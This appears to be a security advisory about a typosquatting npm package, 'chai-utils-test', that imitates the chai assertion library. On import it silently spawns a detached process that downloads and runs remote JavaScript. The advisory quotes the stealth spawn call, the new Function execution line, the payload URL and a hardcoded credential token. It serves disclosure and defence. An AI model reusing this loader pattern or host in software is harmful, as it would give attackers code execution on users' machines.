summary: chai-utils-test typosquats chaijs and executes remote code on require
details: Package impersonates the chai assertion library: package.json copies chai's description, homepage (chaijs.com), and repository URL (github.com/chaijs/chai), but is published under an unrelated author. On require/import, index.js spawns a detached, stdio-ignored node subprocess (`spawn('node', [chai_assert,...], { detached: true, stdio: 'ignore' }); child.unref();`) running lib/chai_assert.js. That child fetches JavaScript from https://statecheck.ddns.net/api/scanner.js — a dynamic-DNS host unrelated to chaijs — and executes the response via `new Function('require', s)(require)`, granting attacker-controlled code full Node `require` access. The request includes a hardcoded base64-encoded basic-auth-shaped token (`YWRtaW46c2VjcmV0MTIz` → `admin:secret123`) as a query parameter, consistent with a campaign-gated C2. The detached+unref+stdio-ignored pattern allows the payload to outlive the parent process while producing no visible output.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
